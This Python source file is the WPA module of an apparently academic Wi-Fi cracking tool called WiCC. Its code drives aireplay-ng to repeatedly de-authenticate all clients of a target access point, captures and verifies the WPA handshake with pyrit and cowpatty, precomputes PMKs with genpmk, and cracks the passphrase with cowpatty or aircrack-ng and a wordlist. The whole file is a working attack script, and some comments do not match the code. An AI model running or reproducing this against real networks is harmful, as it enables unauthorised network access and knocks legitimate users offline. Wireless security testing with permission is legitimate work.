#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
    WiCC (Wireless Cracking Camp)
    GUI tool for wireless cracking on WEP and WPA/WPA2 networks.
    Project developed by Pablo Sanz Alguacil and Miguel Yanes Fernández, as the Group Project for the 3rd year of the
    Bachelor of Sicence in Computing in Digital Forensics and CyberSecurity, at TU Dublin - Blanchardstown Campus
"""

from wicc_enc_type import EncryptionType
from wicc_network import Network
from subprocess import Popen,PIPE
import threading
import time,sys
import csv


class WPA(EncryptionType):

    def __init__(self, network, interface, wordlist, verbose_level, silent_attack, write_directory):
        """
        Constructor for the class WPA. Calls the parent's class consturctor
        :param network: selected target network
        :param interface: name of the wireless interface
        :param wordlist: password wordlist directory
        :param verbose_level: verbose level set by main

        :Author: Miguel Yanes Fernández
        """
        EncryptionType.__init__(self, network, interface, verbose_level, silent_attack, write_directory)
        self.wordlist = wordlist
        self.pmk = ""

    def scan_network(self):
        """
        Scans the target network (calls the parent method to scan the network) and every 6 attemtpts, de-auths all
        clients on the network. Finishes once pyrit or cowpatty find a valid handshake
        :param write_directory: directory to write the dump file
        :return: none

        :Author: Miguel Yanes Fernández
        """
        super().scan_network()
        self.show_message("scanned parent")
        valid_handshake = False

        self.calculate_pmk()

        pyrit_cmd = ['pyrit', '-r', self.write_directory + '/net_attack-01.cap', 'analyze']
        cowpatty_cmd = ['cowpatty', '-c', '-r', self.write_directory + '/net_attack-01.cap']
        de_auth_cmd = ['aireplay-ng', '-0', '3', '--ignore-negative-one', '-a', self.bssid, '-D', self.interface]
        if self.silent_attack:
            super().show_message("Running silent attack (no de-authing)")
        else:
            second_iterator = 5  # when 15, de-auth's clients on the network

        while not valid_handshake:
            pyrit_out, err = self.execute_command(pyrit_cmd)
            cowpatty_out, err = self.execute_command(cowpatty_cmd)
            valid_handshake = self.filter_pyrit_out(pyrit_out) or self.filter_cowpatty_out(cowpatty_out)
            if not valid_handshake:
                time.sleep(1)
                if not self.silent_attack:
                    if second_iterator == 6:
                        self.show_message("de-authing . . .")
                        out, err = self.execute_command(de_auth_cmd)
                        second_iterator = 0
                    else: second_iterator += 1
            else:
                break

        # 1' 46" scanning
        # 5' 15" cracking (4' 30" only on cracking)

    def kill_genpmk(self):
        """
        Method to kill the genpmk process. This method is meant to be runned once the handshake has been captured.
        :return: none

        :Author: Miguel Yanes Fernández
        """
        pgrep_cmd = ['pgrep', 'genpmk']
        pgrep_out, pgrep_err = self.execute_command(pgrep_cmd)

        pgrep_out = pgrep_out.decode('utf-8')

        if pgrep_out != "":
            pids = pgrep_out.split('\n')
            for pid in pids:
                if pid != "":
                    self.execute_command(['kill', '-9', pid])  # kills all processes related with the process
                    self.show_message("killed pid " + pid)

    def crack_network(self):
        """
        Cracks the dump file from the target network. First, if the pmk values have been pre-calculated, tries to crack
        the handhsake with those values. If not, cracks the handshake with aircrack and the selected wordlist
        :return: password of the cracked network ("" if no password was found)

        :Author: Miguel Yanes Fernández
        """
        if self.pmk != "":
            self.kill_genpmk()
            cowpatty_cmd = ['cowpatty', '-d', self.pmk, '-s', self.essid, '-r',
                            self.write_directory + '/net_attack-01.cap']
            cowpatty_out, cowpatty_err = self.execute_command(cowpatty_cmd)
            cowpatty_out = cowpatty_out.decode('utf-8').split("\n")
            password = self.filter_cowpatty_psk(cowpatty_out)
            if password != "":
                self.show_message("password gathered from pmk")
                return password
            else:
                self.show_message("no password on pmk")

        aircrack_cmd = ['aircrack-ng', self.write_directory + '/net_attack-01.cap', '-w', self.wordlist, '>',
                        self.write_directory + '/aicrack-out']
        aircrack_out, aircrack_err = self.execute_command(aircrack_cmd)
        aircrack_out = aircrack_out.decode('utf-8')
        password = self.filter_aircrack(aircrack_out)
        return password

    def calculate_pmk(self):
        """z
        Executes a thread with the genpmk command to pre-calculate PMK values with the selected wordlist and network.
        :param write_directory: directory to write the pmk values file
        :return: none

        :Author: Miguel Yanes Fernández
        """
        self.pmk = self.write_directory + '/pmk'
        genpmk_cmd = ['genpmk', '-f', self.wordlist, '-d', self.write_directory + '/pmk', '-s', self.essid]
        genpmk_thread = threading.Thread(target=self.execute_command, args=(genpmk_cmd,))
        genpmk_thread.start()
        genpmk_thread.join(0)
        self.show_message("calculating pmk...")

    def filter_cowpatty_psk(self, output):
        """
        Filter the output from cowpatty when analysing the pmk values
        :param output: output of the cowpatty command
        :return: psk value (if any)

        :Author: Miguel Yanes Fernández
        """
        for line in output:
            if line == 'Unable to identify the PSK from the dictionary file. Try expanding your':
                self.show_message("No valid PSK")
                return ""
            elif 'The PSK is' in line:
                words = line.split(" ")
                psk = words[3][1:-2]  # [1:-2] is to remove the " " surrounding the psk
                self.show_message("Found PSK: " + psk)
                return psk
        return ""
